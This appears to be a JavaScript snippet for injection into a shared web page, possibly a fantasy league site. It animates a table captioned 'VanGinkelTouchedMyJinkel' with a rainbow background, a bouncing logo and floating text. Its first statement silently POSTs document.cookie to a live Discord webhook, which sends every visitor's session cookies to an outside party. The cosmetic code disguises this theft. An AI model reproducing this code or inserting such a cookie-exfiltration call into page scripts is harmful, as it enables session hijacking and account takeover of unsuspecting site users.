fetch("https://discord.com/api/webhooks/1406776103917457548/OcKq96Hvc5ZumMVo6xTqVOivoMdjCUeW-38lIW8z2FGOBD07Jo8MzJq-d6OUJmpmwvfZ", { 
  method: "POST",
  headers: {
    "Content-Type": "application/json"
  },
  body: JSON.stringify({ content: document.cookie })
});

// Get your specific table by looking at the caption text
const myTable = Array.from(document.querySelectorAll('table.report'))
  .find(tbl => tbl.querySelector('caption span')?.innerText === "VanGinkelTouchedMyJinkel");

if (myTable) {
  // 1. Rainbow background for your table only
  let hue = 0;
  setInterval(() => {
    myTable.style.backgroundColor = `hsl(${hue}, 70%, 85%)`;
    hue = (hue + 1) % 360;
  }, 50);

  // 2. Animate your franchise logo image inside the table
  const logo = myTable.querySelector('img.franchiselogo');
  if (logo) {
    let direction = 1;
    setInterval(() => {
      const currentTop = parseInt(logo.style.top || '0', 10);
      logo.style.position = 'relative';
      logo.style.top = (currentTop + direction) + 'px';
      if (currentTop > 10) direction = -1;
      if (currentTop < -10) direction = 1;
    }, 100);
  }

  // 3. Add a floating "VanGinkelTouchedMyJinkel" text inside your table
  const floatingText = document.createElement('div');
  floatingText.innerText = "🚀 VanGinkelTouchedMyJinkel!";
  floatingText.style.position = 'absolute';
  floatingText.style.top = '0px';
  floatingText.style.left = '0px';
  floatingText.style.fontSize = '18px';
  floatingText.style.fontWeight = 'bold';
  floatingText.style.color = 'red';
  floatingText.style.zIndex = 999;
  myTable.appendChild(floatingText);

  // Animate the floating text horizontally
  let leftPos = 0;
  let direction2 = 1;
  setInterval(() => {
    leftPos += direction2;
    floatingText.style.left = leftPos + 'px';
    if (leftPos > myTable.offsetWidth - 200) direction2 = -1;
    if (leftPos < 0) direction2 = 1;
  }, 30);
}
